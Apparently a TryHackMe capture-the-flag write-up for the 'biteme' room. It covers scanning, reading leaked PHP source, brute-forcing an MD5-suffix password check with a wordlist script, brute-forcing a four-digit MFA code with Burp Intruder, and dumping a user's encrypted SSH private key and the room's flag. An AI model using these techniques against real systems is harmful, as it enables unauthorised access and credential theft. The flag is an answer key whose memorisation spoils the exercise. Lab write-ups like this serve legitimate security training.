# biteme — Writeup

## Overview
### biteme — Writeup
### biteme — Writeup
----
Stay out of my server!
----
![](https://images.unsplash.com/photo-1550751827-4bd374c3f58b?ixlib=rb-1.2.1&ixid=MnwxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8&auto=format&fit=crop&w=1470&q=80)
![222](https://tryhackme-images.s3.amazonaws.com/room-icons/55ca2dd6bf60ecc7c1e960ad974fff90.png)
Start Machine
Start the machine and get the flags...
Answer the questions below

## Enumeration
```text
┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.201.234 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.201.234:22
Open 10.10.201.234:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org )
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Initiating Parallel DNS resolution of 1 host.
Completed Parallel DNS resolution of 1 host.
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan
Scanning 10.10.201.234 [2 ports]
Discovered open port 22/tcp on 10.10.201.234
Discovered open port 80/tcp on 10.10.201.234
Completed Connect Scan (2 total ports)
Initiating Service scan
Scanning 2 services on 10.10.201.234
Completed Service scan (2 services on 1 host)
NSE: Script scanning 10.10.201.234.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Nmap scan report for 10.10.201.234
Host is up, received user-set (0.20s latency).

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 89ec671a8587c6f664ada7d19e3a1194 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDOkcBZItsAyhmjKqiIiedZbAsFGm/mkiNHjvggYp3zna1Skix9xMhpVbSlVCS7m/AJdWkjKFqK53OfyP6eMEMI4EaJgAT+G0HSsxqH+NlnuAm4dcXsprxT1UluIeZhZ2zG2k9H6Qkz81TgZOuU3+cZ/DDizIgDrWGii1gl7dmKFeuz/KeRXkpiPFuvXj2rlFOCpGDY7TXMt/HpVoh+sPmRTq/lm7roL4468xeVN756TDNhNa9HLzLY7voOKhw0rlZyccx0hGHKNplx4RsvdkeqmoGnRHtaCS7qdeoTRuzRIedgBNpV00dB/4G+6lylt0LDbNzcxB7cvwmqEb2ZYGzn
|   256 7f6b3cf82150d98b520434a54d033a26 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOZGQ8PK6Ag3kAOQljaZdiZTitqMfwmwu6V5pq1KlrQRl4funq9C45sVL+bQ9bOPd8f9acMNp6lqOsu+jJgiec4=
|   256 c45be5269406ee76217527bccdbaafcc (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMpXlaxVKC/3LXrhUOMsOPBzptNVa1u/dfUFCM3ZJMIA
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.67 seconds

┌──(witty㉿kali)-[~/Downloads]
└─$ dirsearch -u http://10.10.201.234 -i200,301,302,401,500 

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /home/witty/.dirsearch/reports/10.10.201.234/_23-06-23_12-24-31.txt

Error Log: /home/witty/.dirsearch/logs/errors-23-06-23_12-24-31.log

Target: http://10.10.201.234/

[12:24:32] Starting: 
[12:25:50] 301 -  316B  - /console  ->  http://10.10.201.234/console/
[12:25:51] 200 -    4KB - /console/
[12:26:12] 200 -   11KB - /index.html

Task Completed

https://matthewfl.com/unPacker.html

eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('0.1(\'2\').3=\'4\';5.6(\'@7 8 9 a b c d e f g h i... j\');',20,20,'document|getElementById|clicked|value|yes|console|log|fred|I|turned|on|php|file|syntax|highlighting|for|you|to|review|jason'.split('|'),0,{}))

document.getElementById('clicked').value='yes';
console.log('@fred I turned on php file syntax highlighting for you to review... jason');

https://www.php.net/manual/en/function.highlight-file.php

Many servers are configured to automatically highlight files with a _phps_ extension. For example, example.phps when viewed will show the syntax highlighted source of the file.

http://10.10.201.234/console/index.phps

<?php
session_start();

include('functions.php');
include('securimage/securimage.php');

$showError = false;
$showCaptchaError = false;

if (isset($_POST['user']) && isset($_POST['pwd']) && isset($_POST['captcha_code']) && isset($_POST['clicked']) && $_POST['clicked'] === 'yes') {
    $image = new Securimage();

    if (!$image->check($_POST['captcha_code'])) {
        $showCaptchaError = true;
    } else {
        if (is_valid_user($_POST['user']) && is_valid_pwd($_POST['pwd'])) {
            setcookie('user', $_POST['user'], 0, '/');
            setcookie('pwd', $_POST['pwd'], 0, '/');
            header('Location: mfa.php');
            exit();
        } else {
            $showError = true;
        }
    }
}
?>

http://10.10.201.234/console/functions.phps

 <?php
include('config.php');

function is_valid_user($user) {
    $user = bin2hex($user);

    return $user === LOGIN_USER;
}

// @fred let's talk about ways to make this more secure but still flexible
function is_valid_pwd($pwd) {
    $hash = md5($pwd);

    return substr($hash, -3) === '001';
} 

http://10.10.201.234/console/config.phps

 <?php

define('LOGIN_USER', '6a61736f6e5f746573745f6163636f756e74'); 

┌──(witty㉿kali)-[~/Downloads]
└─$ php -a
Interactive shell

php > echo hex2bin('6a61736f6e5f746573745f6163636f756e74');
jason_test_account

┌──(witty㉿kali)-[~/Downloads]
└─$ cat php_md5.php 
<?php

$file = fopen('/usr/share/wordlists/rockyou.txt', 'r');

while (($line = fgets($file)) !== false) {
    $pass = trim($line);
    $hash = md5($pass);
    
    if (substr($hash, -3) === '001') {
        echo $pass . "\n";
        break;
    }
}

fclose($file);
                                                                                      
┌──(witty㉿kali)-[~/Downloads]
└─$ php php_md5.php
violet

jason_test_account:violet

eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('0.1(\'@2 3 4 5 6 7 8 9 a b c, d e f g h... i\');',19,19,'console|log|fred|we|need|to|put|some|brute|force|protection|on|here|remind|me|in|the|morning|jason'.split('|'),0,{}));

console.log('@fred we need to put some brute force protection on here, remind me in the morning... jason');

using burp intruder

code=§1234§ from 1000 to 9999

code 302 I got 2766 

File browser

/home fred and jason

/home/jason

.bash_history
.bash_logout
.bashrc
.cache
.config
.gnupg
.profile
.ssh
.sudo_as_admin_successful
user.txt

File viewer

/home/jason/user.txt

THM{6fbf1fb7241dac060cd3abba70c33070}

/home/jason/.ssh/id_rsa

-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,983BDF3BE962B7E88A5193CD1551E9B9

nspZgFs2AHTCqQUdGbA0reuNel2jMB/3yaTZvAnqYt82m6Kb2ViAqlFtrvxJUTkx
vbc2h5vIV7N54sHQvFzmNcPTmOpy7cp4Wnd5ttgGpykiBTni6xeE0g2miyEUu+Qj
JaLEJzzdiehg0R3LDqZqeuVvy9Cc1WItPuKRLHJtoiKHsFvm9arbW4F/Jxa7aVgH
l5rfo6pEI0liruklDfFrDjz96OaRtdkOpM3Q3GxYV2Xm4h/Eg0CamC7xJC8RHr/w
EONcJm5rHB6nDVV5zew+dCpYa83dMViq7LOGEZ9QdsVqHS59RYEffMc45jkKv3Kn
ky+y75CgYCWjtLbhUc4Ml21kYz/pDdObncIRH3m6aF3w/b0F/RlyAYQYUYGfR3/5
Y9a2/hVbBLX7oM+KQqWHD5c05mLNfAYWTUxtbANVy797CSzYssMcCrld7OnDtFx7
qPonOIRjgtfCodJuCou0o3jRpzwCwTyfOvnd29SF70rN8klzjpxvqNEEbSfnh04m
ss1fTMX1eypmCsHecmpjloTxdPdj1aDorwLkJZtn7h+o3mkWG0H8vnCZArtxeiiX
t/89evJXhVKHSgf83xPvCUvnd2KSjTakBNmsSKoBL2b3AN3S/wwapEzdcuKG5y3u
wBvVfNpAD3PmqTpvFLClidnR1mWE4r4G1dHwxjYurEnu9XKO4d+Z1VAPLI2gTmtd
NblKTwZQCWp20rRErOyT9MxjT1gTkVmpiJ0ObzQHOGKJIVaMS8oEng2gYs48nugS
AsafORd3khez4r/5g9opRj8rdCkK83fG5WA15kzcOJ+BqiKyGU26hCbNuOAHaAbq
Zp+Jqf4K6FcKsrL2VVCmPKOvkTEItVIFGDywp3u+v0LGjML0wbrGtGzP7pPqYTZ5
gJ4TBOa5FUfhQPAJXXJU3pz5svAHgTsTMRw7p8CSfedCW/85bMWgzt5XuQdiHZA0
FeZErRU54+ntlJ1YdLEjVWbhVhzHyBXnEXofj7XHaNvG7+r2bH8GYL6PeSK1Iiz7
/SiK/v4kjOP8Ay/35YFyfCYCykhdJO648MXb+bjblrAJldeXO2jAyu4LlFlJlv6/
bKB7viLrzVDSzXIrFHNoVdFmLqT3yEmui4JgFPgtWoHUOQNUw8mDdfCR0x3GAXZP
XIU1Yn67iZ9TMz6z8HDuc04GhiE0hzI6JBKJP8vGg7X8rBuA7DgoFujSOg7e8HYX
7t07CkDJcAfqy/IULQ8pWtEFTSXz1bFpl360v42dELc6BwhYu4Z4qza9FtYS0L/d
ts5aw3VS07Xp5v/pX+RogV8uIa0jOKTkVy5ZnnlJk1qa9zWX3o8cz0P4TualAn+h
dQBVNOgRIZ11a6NU0bhLCJTL2ZheUwe9MTqvgRn1FVsv4yFGo/hIXb6BtXQE74fD
xF6icxCBWQSbU8zgkl2QHheONYdfNN0aesoFGWwvRw0/HMr4/g3g7djFc+6rrbQY
xibeJfxvGyw0mp2eGebQDM5XiLhB0jI4wtVlvkUpd+smws03mbmYfT4ghwCyM1ru
VpKcbfvlpUuMb4AH1KN0ifFJ0q3Te560LYc7QC44Y1g41ZmHigU7YOsweBieWkY2
-----END RSA PRIVATE KEY-----

┌──(witty㉿kali)-[~/Downloads]
└─$ nano bite_idrsa         
                                                                                                                                                
┌──(witty㉿kali)-[~/Downloads]
└─$ cat bite_idrsa         
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,983BDF3BE962B7E88A5193CD1551E9B9

nspZgFs2AHTCqQUdGbA0reuNel2jMB/3yaTZvAnqYt82m6Kb2ViAqlFtrvxJUTkx
vbc2h5vIV7N54sHQvFzmNcPTmOpy7cp4Wnd5ttgGpykiBTni6xeE0g2miyEUu+Qj
